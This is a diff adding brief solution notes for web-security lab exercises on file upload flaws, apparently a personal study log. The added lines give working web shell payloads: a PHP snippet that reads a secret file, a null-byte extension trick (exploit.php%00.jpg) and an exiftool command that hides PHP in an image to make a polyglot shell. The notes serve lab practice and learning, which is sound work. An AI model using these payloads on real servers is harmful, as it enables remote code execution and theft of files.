@@ -31,6 +31,23 @@
  - Overriding the server configuration 
 
 1. Web shell upload via extension blacklist bypass
+ -solution : upload a image and in POST /my-account/avatar request remove the image data and in filename="virus.hmca" , Content-Type: image/png <?php echo file_get_contents('/home/carlos/secret')?> show the response in the broswer copy secret code and submit.
+
+
+# Obfuscating file extensions
+
+1. Web shell upload via obfuscated file extension
+-solution : capture the request with the with exploit.php in burp and then change the file name exploit.php%00.jpg open the correct path and copy secret code and submit it
+
+
+# Flawed validation of the file's contents
+
+1. Remote code execution via polygot web shell upload
+ -solution : create this {exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" dd.png -o polygot.php 
+                  } and uplaod copy the code and submit
+
+
+
 
 
 
